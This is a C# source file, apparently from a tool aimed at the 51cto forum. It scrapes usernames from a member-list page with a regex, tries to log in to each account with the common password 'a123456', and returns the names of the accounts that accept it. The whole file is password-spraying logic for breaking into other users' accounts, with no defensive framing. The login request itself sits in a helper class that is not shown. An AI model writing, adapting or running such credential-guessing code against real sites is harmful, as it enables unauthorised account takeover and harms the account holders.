using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;

namespace SingCn.Ex51cto.Deal
{
    public class DoLogin
    {
        public static string TestLogin(string html,string passWord = "a123456",
                                       string strPattern = "space-uid-[\\d]*?.html\"[\\s]*?class=\"bold\">([\\s\\S]*?)</a></td>")
        {
            MatchCollection mc = Regex.Matches(html, strPattern);
            string str = string.Empty;
            for (int i = 0; i < mc.Count; i++)
            {
                if (Login(mc[i].Groups[1].Value, passWord))
                {
                    str += mc[i].Groups[1].Value+",";
                }
            }
            str = str.EndsWith(",") ? str.Remove(str.Length - 1) : "失败";
            return str;
        }



        #region 登录
        public static bool Login(string email, string password)
        {
            try
            {
                string str = DoHtml.Login(email, password);
                if (str.IndexOf("scrpit", StringComparison.Ordinal) > -1)
                {
                    return true;
                }
                return false;
            }
            catch (Exception)
            {
                return false;
            }
        }

        #endregion
    }
}
